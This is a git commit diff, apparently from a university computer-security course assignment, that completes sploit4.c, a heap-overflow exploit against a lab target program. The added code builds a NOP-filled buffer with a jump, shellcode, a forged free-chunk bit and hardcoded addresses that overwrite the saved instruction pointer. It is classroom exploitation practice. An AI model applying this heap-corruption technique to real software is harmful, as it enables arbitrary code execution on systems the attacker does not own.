4d34e39d635281785cca76dee53aaa01706808aa
Leo Martel <lmartel@stanford.edu>
2015-04-21 22:21:24 +0000

    sploit 4, hooray

--- proj1/sploits/sploit4.c
+++ proj1/sploits/sploit4.c
@@ -11,7 +11,24 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char sploit[500 + 8 + 4 + 1];
+
+  memset(sploit, 0x90, sizeof sploit); // NOP NOP NOP
+
+  // instruction: jmp 6 bytes
+  sploit[0] = 0xeb;
+  sploit[1] = 0x06;
+
+  // ensure free bit is ON
+  sploit[4] |= 0x01;
+  memcpy(sploit + 8, shellcode, sizeof shellcode - 1);
+    
+  *((int *) (sploit + 504)) = 0x804a068; // beginning of p, where we're putting the sploit
+  *((int *) (sploit + 508)) = 0xbffffc64; // eip
+  
+  sploit[512] = '\0';
+
+  args[0] = TARGET; args[1] = sploit; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
